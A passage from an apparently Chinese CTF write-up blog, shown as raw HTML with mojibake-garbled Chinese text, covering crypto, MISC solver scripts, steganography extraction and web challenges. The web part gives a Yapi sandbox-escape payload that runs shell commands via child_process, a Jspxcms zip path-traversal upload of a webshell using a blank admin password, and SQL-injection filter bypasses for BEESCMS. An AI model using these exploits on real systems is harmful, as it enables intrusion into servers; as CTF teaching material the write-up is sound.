class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">trick = raw_input(<span class="string">&quot;&quot;</span>)</span><br><span class="line">trick = pad(trick.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">cipher = enc.encrypt(trick)</span><br><span class="line"><span class="keyword">if</span> trick == cipher <span class="keyword">and</span> trick != <span class="string">&quot;&quot;</span> :</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="built_in">print</span>(f.read())</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(cipher.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Try again&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">exit()</span><br></pre></td></tr></table></figure></blockquote><p>AES-CBCæ¨¡å¼åŸç†ã€‚</p><p>ç¬¬ä¸€æ¬¡ï¼š</p><p>ä»¤ <code>P0 = IV</code></p><p><code>C0 = Encrypt(P0 XOR IV) = Encrypt(0)</code></p><p>ç¬¬äºŒæ¬¡ï¼š</p><p>ä»¤ <code>P1 = C0</code></p><p><code>C1 = Encrypt(P1 XOR C0) = Encrypt(C0 XOR C0) = Encrypt(0) = C0 = P1</code></p><p>â€‹    </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="red-vs-blue"><a href="#red-vs-blue" class="headerlink" title="red_vs_blue"></a>red_vs_blue</h3><blockquote><p>çº¢é˜Ÿå’Œè“é˜Ÿå°†å¼€å±•66è½®å¯¹æŠ—ï¼Œä½ èƒ½é¢„æµ‹å‡ºæ¯è½®å¯¹æŠ—çš„ç»“æœå—ï¼Ÿ</p><p>ncè¿æ¥</p></blockquote><p>åŒä¸€æ¬¡è¿æ¥å†…ï¼Œé”™è¯¯å¯ä»¥åå¤ä»å¤´çŒœï¼Œ66æ¬¡éšæœºç»“æœä¸å˜ï¼Œå­˜å‚¨ä¹‹å‰çŒœå¯¹çš„æ­£ç¡®ç»“æœï¼Œé”™è¯¯æ—¶å†é‡çŒœå½“å‰æ¬¡æ•°çš„å¦ä¸€ç§ç»“æœå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29203</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">ans=[<span class="string">&#x27;?&#x27;</span>]*<span class="number">67</span></span><br><span class="line"></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i&lt;=<span class="number">66</span>:</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line">r.recvline()</span><br><span class="line"><span class="keyword">if</span> ans[i]==<span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">r.sendline(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">x=r.recvline()</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> x:</span><br><span class="line">ans[i]=<span class="string">&#x27;r&#x27;</span></span><br><span class="line">i+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;Sorry&#x27;</span> <span class="keyword">in</span> x:</span><br><span class="line">ans[i]=<span class="string">&#x27;b&#x27;</span></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Play again? (y/n): &#x27;</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">r.sendline(ans[i])</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">i+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="funny-maze"><a href="#funny-maze" class="headerlink" title="funny_maze"></a>funny_maze</h3><blockquote><p>ä¸ƒæœˆè¢«å›°åœ¨äº†è¿·å®«é‡Œï¼Œåç§’åè¿·å®«çš„ç»ˆç‚¹å°±è¦æ°¸è¿œæ¶ˆå¤±äº†ï¼Œä½ èƒ½å¸®å¥¹èµ°å‡ºè¿·å®«å—ï¼Ÿ</p><p>nc è¿æ¥</p></blockquote><p>DFSç®—æ³•èµ°è¿·å®«ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27139</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sol</span>(<span class="params">maze</span>):</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(path) &gt; <span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join(<span class="string">&#x27;&#x27;</span>.join(row) <span class="keyword">for</span> row <span class="keyword">in</span> maze))</span><br><span class="line">solution = <span class="string">&#x27;&#x27;</span>.join(path)[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(solution)</span><br><span class="line"><span class="keyword">global</span> path</span><br><span class="line">path = []</span><br><span class="line"><span class="keyword">return</span> solution</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">maze, y, x</span>):</span></span><br><span class="line"><span class="keyword">if</span> maze[y][x] <span class="keyword">in</span> (<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;S&#x27;</span>):</span><br><span class="line">tag = <span class="string">&#x27;o&#x27;</span></span><br><span class="line">maze[y][x] = tag</span><br><span class="line"><span class="keyword">if</span> dfs(maze, y, x+<span class="number">1</span>) == <span class="literal">True</span>:</span><br><span class="line">tag = <span class="string">&#x27;R&#x27;</span></span><br><span class="line">path.append(tag)</span><br><span class="line"><span class="keyword">elif</span> dfs(maze, y+<span class="number">1</span>, x) == <span class="literal">True</span>:</span><br><span class="line">tag = <span class="string">&#x27;D&#x27;</span></span><br><span class="line">path.append(tag)</span><br><span class="line"><span class="keyword">elif</span> dfs(maze, y, x-<span class="number">1</span>) == <span class="literal">True</span>:</span><br><span class="line">tag = <span class="string">&#x27;L&#x27;</span></span><br><span class="line">path.append(tag)</span><br><span class="line"><span class="keyword">elif</span> dfs(maze, y-<span class="number">1</span>, x) == <span class="literal">True</span>:</span><br><span class="line">tag = <span class="string">&#x27;U&#x27;</span></span><br><span class="line">path.append(tag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">tag = <span class="string">&#x27; &#x27;</span></span><br><span class="line">maze[y][x] = tag</span><br><span class="line"><span class="keyword">return</span> (tag != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> maze[y][x] == <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">maze = []</span><br><span class="line"></span><br><span class="line">first = p.recvline().strip()</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;#&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> first:</span><br><span class="line"><span class="built_in">print</span>(first)</span><br><span class="line"><span class="built_in">print</span>(p.recvall())</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">leng = <span class="built_in">len</span>(first)</span><br><span class="line">maze.append(<span class="built_in">list</span>(first))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(leng-<span class="number">1</span>):</span><br><span class="line">now = p.recvline().strip()</span><br><span class="line">maze.append(<span class="built_in">list</span>(now))</span><br><span class="line"></span><br><span class="line">start = []</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(maze)):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(maze[y])):</span><br><span class="line"><span class="keyword">if</span> maze[y][x] == <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">start = [y,x]</span><br><span class="line"></span><br><span class="line">path = []</span><br><span class="line">dfs(maze, start[<span class="number">0</span>], start[<span class="number">1</span>])</span><br><span class="line">sol = get_sol(maze)</span><br><span class="line"><span class="built_in">print</span>(sol)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(sol)+<span class="number">1</span>))</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ezSteganography"><a href="#ezSteganography" class="headerlink" title="ezSteganography"></a>ezSteganography</h3><blockquote><p>æœ‰æ‰‹å°±è¡Œçš„éšå†™</p></blockquote><p>10M+ pngå›¾ã€‚</p><p>zstegåœ¨Gé€šé“å‘ç°éšå†™å¦ä¸€pngå›¾ï¼Œæ–‡å­—åªæœ‰ä¸€åŠflagï¼š</p><p><img src="/2021/08/01/match-2021DASCTF-July-X-CBCTF-4th/part1.png" alt="part1" style="zoom: 25%;"></p><p>æŸ¥æ‰¾QIMç®—æ³•ï¼š</p><blockquote><p>é‡åŒ–ç´¢å¼•è°ƒåˆ¶ç®—æ³•(QIM)æ˜¯ä¸€ç§ç»å…¸çš„æ°´å°ç®—æ³•ï¼Œå®ƒæ ¹æ®æ°´å°ä¿¡æ¯ï¼ŒæŠŠåŸå§‹è½½ä½“æ•°æ®ç”¨é‡åŒ–å™¨é‡åŒ–åˆ°ä¸åŒçš„ç´¢å¼•åŒºé—´ï¼Œèƒ½åœ¨è·å–è¾ƒé«˜çš„é²æ£’æ€§åŒæ—¶ï¼Œå…·æœ‰è¾ƒå°åµŒå…¥å¤±çœŸã€‚QIMç®—æ³•èƒ½æœ‰æ•ˆæŠµæŠ—æ»¤æ³¢ã€å™ªå£°ã€å‰ªåˆ‡ç­‰å¸¸è§æ”»å‡»ã€‚</p></blockquote><p>æ‰¾åˆ°<a href="https://github.com/pl561/QuantizationIndexModulation">å…·ä½“å®ç°ä»£ç </a>ï¼Œå°†è¾“å…¥ä»ä¸€ç»´ä¿®æ”¹ä¸ºäºŒç»´å›¾åƒçŸ©é˜µï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;Implementation of QIM method from Data Hiding Codes, Moulin and Koetter, 2005&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">HOME = os.environ[<span class="string">&quot;HOME&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QIM</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, delta</span>):</span></span><br><span class="line">self.delta = delta</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">embed</span>(<span class="params">self, x, m</span>):</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">x is a vector of values to be quantized individually</span></span><br><span class="line"><span class="string">m is a binary vector of bits to be embeded</span></span><br><span class="line"><span class="string">returns: a quantized vector y</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">x = x.astype(<span class="built_in">float</span>)</span><br><span class="line">d = self.delta</span><br><span class="line">y = np.<span class="built_in">round</span>(x/d) * d + (-<span class="number">1</span>)**(m+<span class="number">1</span>) * d/<span class="number">4.</span></span><br><span class="line"><span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detect</span>(<span class="params">self, z</span>):</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">z is the received vector, potentially modified</span></span><br><span class="line"><span class="string">returns: a detected vector z_detected and a detected message m_detected</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shape = z.shape</span><br><span class="line">z = z.flatten()</span><br><span class="line"></span><br><span class="line">m_detected = np.zeros_like(z, dtype=<span class="built_in">float</span>)</span><br><span class="line">z_detected = np.zeros_like(z, dtype=<span class="built_in">float</span>)</span><br><span class="line"></span><br><span class="line">z0 = self.embed(z, <span class="number">0</span>)</span><br><span class="line">z1 = self.embed(z, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d0 = np.<span class="built_in">abs</span>(z - z0)</span><br><span class="line">d1 = np.<span class="built_in">abs</span>(z - z1)</span><br><span class="line"></span><br><span class="line">gen = <span class="built_in">zip</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(z_detected)), d0, d1)</span><br><span class="line"><span class="keyword">for</span> i, dd0, dd1 <span class="keyword">in</span> gen:</span><br><span class="line"><span class="keyword">if</span> dd0 &lt; dd1:</span><br><span class="line">m_detected[i] = <span class="number">0</span></span><br><span class="line">z_detected[i] = z0[i]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">m_detected[i] = <span class="number">1</span></span><br><span class="line">z_detected[i] = z1[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">z_detected = z_detected.reshape(shape)</span><br><span class="line">m_detected = m_detected.reshape(shape)</span><br><span class="line"><span class="keyword">return</span> z_detected, m_detected.astype(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_msg</span>(<span class="params">self, l</span>):</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">returns: a random binary sequence of length l</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">return</span> np.random.choice((<span class="number">0</span>, <span class="number">1</span>), l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_qim</span>():</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">tests the embed and detect methods of class QIM</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#l = 10000 # binary message length</span></span><br><span class="line">delta = <span class="number">20</span> <span class="comment"># quantization step</span></span><br><span class="line">qim = QIM(delta)</span><br><span class="line"></span><br><span class="line"><span class="comment">#x = np.random.randint(0, 255, l).astype(float) # host sample</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#msg = qim.random_msg(l)</span></span><br><span class="line"><span class="comment">#y = qim.embed(x, msg)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;ezSteganography-flag.png&#x27;</span>)</span><br><span class="line">y = np.array(img)</span><br><span class="line"></span><br><span class="line">z_detected, msg_detected = qim.detect(y)</span><br><span class="line">new_img = Image.fromarray(np.uint8(<span class="number">255</span>*msg_detected))</span><br><span class="line">new_img.save(<span class="string">&#x27;part2.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(x)</span></span><br><span class="line"><span class="comment">#print(msg)</span></span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"><span class="built_in">print</span>(z_detected)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(msg)</span></span><br><span class="line"><span class="built_in">print</span>(msg_detected)</span><br><span class="line"><span class="comment">#assert np.allclose(msg, msg_detected) # compare the original and detected messages</span></span><br><span class="line"><span class="comment">#assert np.allclose(y, z_detected) # compare the original and detected vectors</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">test_qim()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">sys.exit(main())</span><br></pre></td></tr></table></figure><p>å¾—åˆ°éšå†™pngæ°´å°å›¾ç‰‡ï¼š</p><p><img src="/2021/08/01/match-2021DASCTF-July-X-CBCTF-4th/part2.png" alt="part2" style="zoom: 25%;"></p><p>â€‹    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h3><blockquote><p>ä½ çœŸçš„ä¼š nodejs å—ï¼Ÿ</p></blockquote><p><a href="https://www.secpulse.com/archives/162502.html">Yapiè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</a>ã€‚</p><p>æ³¨å†Œå¹¶ç™»å½•è´¦å·ï¼Œæ·»åŠ é¡¹ç›®ï¼Œé€‰æ‹©è®¾ç½®ï¼Œè®¾ç½®å…¨å±€mockè„šæœ¬ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="built_in">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="built_in">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString()</span><br></pre></td></tr></table></figure><p>æ‰“å¼€è„šæœ¬ï¼Œæ·»åŠ ä¸€ä¸ªæ¥å£ï¼Œè®¿é—®Mockåœ°å€å³å¯æˆåŠŸRCEã€‚</p><p>â€‹    </p><h3 id="jspxcms"><a href="#jspxcms" class="headerlink" title="jspxcms"></a>jspxcms</h3><blockquote><p><a href="http://sdejkwdfnewi3f2jr32d3edfewd.dasctf.node4.buuoj.cn:82/">http://sdejkwdfnewi3f2jr32d3edfewd.dasctf.node4.buuoj.cn:82/</a></p><p>é¶æœºæ¯ååˆ†é’Ÿé‡ç½®ä¸€æ¬¡ã€‚</p></blockquote><p><a href="https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/">Jspxcmsè§£å‹getshellæ¼æ´</a>ã€‚</p><p>å‚è€ƒ<a href="https://www.laoliang.net/jsjh/technology/6525.html">ä¿¡æ¯</a>ç™»å½•åå°<code>/cmscp/index.do</code>ï¼Œ<code>admin/ç©º</code> å¼±å£ä»¤è¿›å…¥åå°ï¼Œåœ¨æ–‡ä»¶ç®¡ç†å¯ä¸Šä¼ æ–‡ä»¶ã€‚</p><p>è™½ç„¶èƒ½ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œä½†åœ¨<code>JspDispatcherFilter.java</code>é™åˆ¶äº†å¯¹jspæ–‡ä»¶çš„è®¿é—®ï¼Œä½†å¯ä¸Šä¼ å¹¶è§£å‹zipæ–‡ä»¶ï¼Œå› <code>WebFileUploadsController.java</code>é‡Œçš„<code>unzip</code>æ–¹æ³•è°ƒç”¨äº†ä¸‹å±‚æ–¹æ³•å´æ²¡æœ‰è¿›è¡Œæ–‡ä»¶åæ£€æŸ¥ï¼Œå¯¼è‡´å¯ä»¥ç›®å½•ç©¿é€ã€‚</p><p>å°†å¤§é©¬<code>cmd.war</code>æ‰“åŒ…ä¸Šä¼ å¹¶è§£å‹ï¼Œé»˜è®¤æ”¾åœ¨<code>\webapps\ROOT\uploads\1\</code>ä¸‹ï¼Œå†ä¿®æ”¹æ–‡ä»¶åä¸º<code>../../../cmd.war</code>å³å¯å°†<code>cmd.war</code>ç½®äº<code>webapps</code>æ ¹ç›®å½•ä¸‹ï¼Œå¯è‡ªåŠ¨è§£æã€‚</p><p>è®¿é—®<code>/cmd</code>æŸ¥çœ‹æ ¹ç›®å½•flagã€‚</p><p>â€‹    </p><h3 id="cybercms"><a href="#cybercms" class="headerlink" title="cybercms"></a>cybercms</h3><blockquote><p>èµ›åšCMSï¼Œåªä¸ºå®‰å…¨è€Œç”Ÿ</p><p>Hint: ä¿¡æ¯æœé›†æ˜¯ä¸€ä¸ªwebæ‰‹å¿…å¤‡çš„æŠ€èƒ½</p></blockquote><p>ä¸‹è½½æºç <code>www.zip</code>ï¼Œåœ¨<code>/admin/version.php</code>ä¸­å‘ç°æ­¤ä¸ºBEESCMS v4.0æ”¹çš„CMSã€‚</p><p>æ‰¾åˆ°åå°ç™»å½•é¡µé¢å­˜åœ¨<a href="https://www.cnblogs.com/yuzly/p/11423384.html">Beescms_v4.0 SQLæ³¨å…¥æ¼æ´</a>ï¼Œä¸åŒåœ¨äºè¿‡æ»¤å‡½æ•°é™¤äº†<code>fl_value</code>å’Œ<code>fl_html</code>ï¼Œè¿˜å¤šäº†ä¸ª<code>f1_vvv</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_value</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\.\.\/|\.\/| union | from | where | group | into |load_file</span></span><br><span class="line"><span class="string">|outfile/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line">define(<span class="string">&#x27;INC_BEES&#x27;</span>,<span class="string">&#x27;B&#x27;</span>.<span class="string">&#x27;EE&#x27;</span>.<span class="string">&#x27;SCMS&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_html</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> htmlspecialchars(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1_vvv</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\ /i&quot;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;Go away,bad hacker!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">preg_replace(<span class="string">&#x27;/0x/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>fl_value</code>è¿‡æ»¤å…³é”®å­—ï¼Œå¯åŒå†™ç»•è¿‡ï¼›</p><p><code>f1_html</code>ä¸­<code>htmlspecialchars</code>åªå¯¹åŒå¼•å·ç¼–ç ï¼Œå¯ç”¨å•å¼•å·ç»•è¿‡ï¼›</p><p><code>f1_vvv</code>ä¸­è¿‡æ»¤ç©ºæ ¼å’Œ<code>0x</code>ï¼Œç©ºæ 